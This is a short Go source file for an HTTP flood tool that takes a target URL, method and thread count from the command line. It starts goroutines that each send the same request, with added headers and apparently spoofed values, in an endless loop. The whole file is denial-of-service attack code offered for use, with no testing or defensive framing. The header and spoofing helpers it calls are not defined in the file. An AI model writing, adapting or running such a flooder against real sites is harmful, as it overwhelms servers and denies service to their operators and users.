package main

import(
  "log"
  "os"
  "strconv"

  "github.com/valyala/fasthttp"
)

var target struct{
  url string
  threads int
  method string
  a_type string
}

func httpflood(){
  head := NewHeader(false, nil)
  sp := NewSpoof(5)
  client := &fasthttp.Client{}
  req := fasthttp.AcquireRequest()
  req.SetRequestURI(target.url)
  req.Header.SetMethod(target.method)
  head.headers(req)
  sp.spoofS(req)
  for{
    client.Do(req, nil)
  }
}

func main(){
  target.url = os.Args[1]
  target.method = os.Args[2]
  threads, _ := strconv.Atoi(os.Args[3])
  log.Print("Started...")
  for i:=0; i < threads; i++{
    go httpflood()
  }

  <- make(chan bool, 1)
}
